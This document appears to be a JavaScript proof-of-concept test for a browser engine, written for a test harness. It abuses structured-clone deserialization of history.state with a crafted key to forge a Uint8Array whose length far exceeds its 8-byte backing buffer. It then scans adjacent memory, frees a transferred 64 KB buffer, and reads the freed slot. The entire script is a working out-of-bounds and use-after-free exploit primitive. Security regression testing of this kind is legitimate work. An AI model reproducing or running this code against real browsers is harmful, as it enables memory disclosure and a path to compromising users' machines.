// Sample a mapped fixed-buffer slot immediately after an unreturned transfer.
function makeKey() {
  var bytes = [0, 0, 0, 0x16, 0x02, 8];
  for (var i = 1; i < 8; i++) bytes.push(0);
  bytes.push(0xf8);
  for (var j = 1; j < 8; j++) bytes.push(0xff);
  bytes.push(0x13, 3, 0, 0xff, 0xff, 0xff, 0xff);
  var chars = [];
  for (var k = 0; k < bytes.length; k += 2)
    chars.push(String.fromCharCode(bytes[k] | bytes[k + 1] << 8));
  return (chars.join("") + "A".repeat(256)).slice(0, 256);
}
function mark(name) {
  if (api && typeof api.markSync === "function") api.markSync(name);
}
function words(bytes) {
  var result = [];
  for (var i = 0; i + 7 < bytes.length; i += 8) {
    var hex = "";
    for (var j = 7; j >= 0; j--)
      hex += bytes[i + j].toString(16).padStart(2, "0");
    result.push("0x" + hex);
  }
  return result.join(",");
}
var phase = "build";
var result;
try {
  var backing = new ArrayBuffer(8, { maxByteLength: 16 });
  new Uint8Array(backing).fill(0x41);
  var fixed = new ArrayBuffer(65536);
  new Uint8Array(fixed).fill(0x91);
  var filler = new Array(253);
  filler[0] = BigInt(1) << BigInt(40);
  filler[1] = backing;
  filler[2] = fixed;
  for (var n = 3; n < 27; n++) {
    var neighbor = new ArrayBuffer(8, { maxByteLength: 16 });
    new Uint8Array(neighbor).fill(0x40 + n);
    filler[n] = neighbor;
  }
  for (var k = 27; k < filler.length; k++) filler[k] = {};
  var shared = { marker: 0x51515151 };
  var input = { filler: filler, first: shared, second: shared };
  input[makeKey()] = 0;
  history.replaceState(input, "");
  mark("free_metadata_stored");
  phase = "load";
  var output = history.state;
  mark("free_metadata_loaded");
  var target = output.filler[1];
  var synthetic = output["\u0000"];
  var cloned = new Uint8Array(output.filler[2]);
  var valid = synthetic instanceof Uint8Array && synthetic.buffer === target &&
    synthetic.byteOffset === 8 && synthetic.length > 1e12 &&
    target.byteLength === 8 && cloned.length === 65536;
  var first = -1;
  var changed = 0;
  var before = [];
  var after = [];
  var detachedLength = null;
  if (valid) {
    phase = "locate";
    var limit = 262144;
    var baseline = new Uint8Array(limit);
    for (var b = 0; b < limit; b++) baseline[b] = synthetic[b];
    cloned.fill(0xc4);
    for (var q = 0; q < limit; q++) {
      if (synthetic[q] !== baseline[q]) {
        changed++;
        if (first < 0) first = q;
      }
    }
    if (first >= 0 && first + 65536 > limit)
      for (var tail = limit; tail < first + 65536; tail++)
        if (synthetic[tail] === 0xc4) changed++;
    cloned.fill(0x91);
    mark("free_metadata_mapped");
    if (changed === 65536 && first >= 0 &&
        synthetic[first] === 0x91 && synthetic[first + 65535] === 0x91) {
      for (var i = 0; i < 64; i++) before.push(synthetic[first + i]);
      phase = "release";
      mark("free_metadata_before_release");
      structuredClone(0, { transfer: [output.filler[2]] });
      detachedLength = cloned.length;
      mark("free_metadata_before_read");
      phase = "read_freed_slot";
      for (var j = 0; j < 64; j++) after.push(synthetic[first + j]);
      mark("free_metadata_after_read");
    }
  }
  result = { id: "freed_slot_metadata", status: valid && after.length === 64 ? "pass" : "fail", details: {
    view_valid: valid, first_index: first, changed_bytes: changed,
    detached_length: detachedLength, before_words: words(before),
    after_words: words(after), target_first: new Uint8Array(target)[0]
  } };
} catch (error) {
  result = { id: "freed_slot_metadata", status: "error", details: {
    phase: phase, error: String(error).slice(0, 200)
  } };
}
try { history.replaceState(null, ""); }
catch (error) { result.status = "error"; result.details.cleanup_error = String(error).slice(0, 100); }
return [result];
